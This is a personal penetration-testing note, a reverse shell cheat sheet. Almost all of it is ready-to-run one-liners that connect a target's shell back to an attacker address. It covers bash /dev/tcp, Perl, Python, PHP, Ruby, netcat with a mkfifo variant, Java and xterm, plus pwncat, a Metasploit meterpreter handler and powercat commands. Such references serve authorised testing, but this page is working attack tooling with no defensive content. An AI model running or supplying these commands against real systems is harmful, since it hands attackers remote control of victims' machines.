---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
## Reverse shell cheat sheet

- [[#Bash]]
- [[#PERL]]
- [[#Python]]
- [[#PHP]]
- [[#Ruby]]
- [[#Netcat]]
- [[#Java]]
- [[#xterm]]
- [[#Pwncat]]
- [[#msfconsole]]
- [[#Powercat]]


### [[TechLexicon/Penetration Testing/Reference/P3nT3sT/Shell/Bash]]

Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):

````bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
````

### PERL

Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):

````perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
````

There’s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell).

### Python

This was tested under Linux / Python 2.7:

````python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
````

### PHP

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

````php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
````

If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

### Ruby

````ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
````

### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

````nc
nc -e /bin/sh 10.0.0.1 1234
````

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

### Java

````java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
````

[Untested submission from anonymous reader]

### [[Pwncat]]

```bash
pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3
```



### msfconsole
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.10; set lport 9009; exploit"
```

### [[Powercat]]
**Listener + client**

```powershell
Basic Client:
    powercat -c 10.1.1.1 -p 443
Basic Listener:
    powercat -l -p 8000

```



### xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

xterm -display 10.0.0.1:1

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

Xnest :1

You’ll need to authorise the target to connect to you (command also run on your host):

xhost +targetip


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
